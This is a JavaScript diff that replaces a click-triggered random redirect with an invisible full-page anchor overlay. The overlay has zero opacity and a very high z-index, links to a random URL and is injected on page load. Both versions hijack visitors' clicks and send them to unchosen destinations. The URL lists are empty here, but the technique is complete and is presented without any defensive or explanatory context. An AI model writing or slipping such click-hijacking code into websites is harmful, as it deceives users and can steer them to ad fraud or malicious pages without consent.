@@ -1,22 +1,14 @@
-function init() {
-  var arr = [];
- 
-  var didOpen = false;
-  document.addEventListener("click", function() {
-    if (didOpen) {
-      return;
-    }
-    didOpen = true;
-    setTimeout(() => {
-      didOpen = false;
-    }, 15000);
+function createLink() {
+  var urls = [];
 
-    var randomIndex = Math.floor(Math.random() * arr.length);
-    var randomLink = arr[randomIndex];
-    window.location.href = randomLink;
-  });
+  if (urls.length === 0) {
+    return;
+  }
+  var a = document.createElement('a');
+  a.href = urls[Math.floor(Math.random() * urls.length)];
+  a.rel = 'noopener noreferrer';
+  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
+  document.body.appendChild(a);
 }
 
-setTimeout(() => {
-  init();
-}, 1000);
+document.addEventListener('DOMContentLoaded', createLink);
